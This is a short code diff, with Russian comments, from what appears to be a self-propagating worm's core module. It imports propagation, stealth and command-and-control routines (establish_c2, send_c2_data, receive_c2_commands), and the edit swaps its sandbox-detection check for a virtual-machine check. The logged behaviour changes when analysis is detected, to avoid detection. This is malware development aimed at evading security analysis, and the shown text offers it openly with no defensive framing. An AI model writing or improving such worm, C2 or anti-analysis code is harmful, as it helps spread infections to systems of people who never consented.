@@ -8,7 +8,7 @@ from datetime import datetime
 
 # Импортируем свои модули
 from worm.propagation import propagate, propagate_targeted
-from stealth.stealth import enable_stealth, check_sandbox
+from stealth.stealth import enable_stealth, is_vm
 from comms.comms import establish_c2, send_c2_data, receive_c2_commands
 
 # Настройка логирования
@@ -47,7 +47,7 @@ class WormCore:
         self.running = True
         
         # Проверяем, не находимся ли в песочнице
-        self.sandbox_detected = check_sandbox()
+        self.sandbox_detected = is_vm()
         if self.sandbox_detected:
             logger.warning("Sandbox environment detected! Changing behavior...")
             # Изменяем поведение, чтобы избежать обнаружения
